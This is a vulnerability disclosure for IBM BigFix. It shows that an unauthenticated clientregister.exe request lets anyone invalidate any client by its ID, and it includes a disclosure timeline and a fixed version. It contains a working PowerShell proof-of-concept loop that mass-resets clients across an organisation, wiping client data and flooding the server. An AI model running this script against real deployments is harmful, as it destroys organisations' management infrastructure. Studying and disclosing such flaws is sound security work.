## Overview

BigFix clients that find themselves in error states issue a command against the BigFix server to invalidate themselves. This allows them to gracefully reset and to inform the server that things like Report IDs, etc will no longer match their expected values coming from the client.

## Vulnerability

When a client detects an issue with it's current state it may invalidate itself by calling:

http://bigfix:52311/cgi-bin/bfenterprise/clientregister.exe?RequestType=InvalidateAndReRegisterMe

By supplying &Body=$Number after that request you can invalidate any bigfix client based on it's ID.

Resetting a client causes the client to delete all __BESData directory information, causes it to get a new client ID, and lose any manual group memberships.

The client must then evaluate all content, report back in, and will re-perform any initial provisioning tasks. Because any client can invalidate any other client, it would be trivial to have a client invalidate all clients, destroying the infrastructure, filling up the database and generating very large amounts of  network traffic.

## Potential Mitigation

Authenticating Relays is a potential mitigation but would only prevent this attack from occurring anonymously -- an attacker would need just one malicious client running BigFix to perform this attack against an authenticating relay.
Steps to Reproduce Vulnerability: Use below powershell script against a BigFix root. The higher the number of clients on the root the more effective the attack.

## Proof of Concept

Depending on the speed of the system involved you can easily do 1000 requests per second and force an organization-wide client reset within about 5 hours.
Sample PCAP/Proof of Concept/Traces or Description of Exploit/Attack Code: Powershell Script
```
foreach ($Number in 100000 .. 10000000) {
invoke-webrequest -uri "http://bigfix-relay:52311/cgi-bin/bfenterprise/clientregister.exe?RequestType=InvalidateAndReRegisterMe&Body=$Number" | out-null
if ($Number % 100 -eq 0) {write-host $Number}
}
```

## Disclosure Timeline
Disclosed on March 1st 2017

Fixed in BigFix 9.5.6 released July 14th 2017
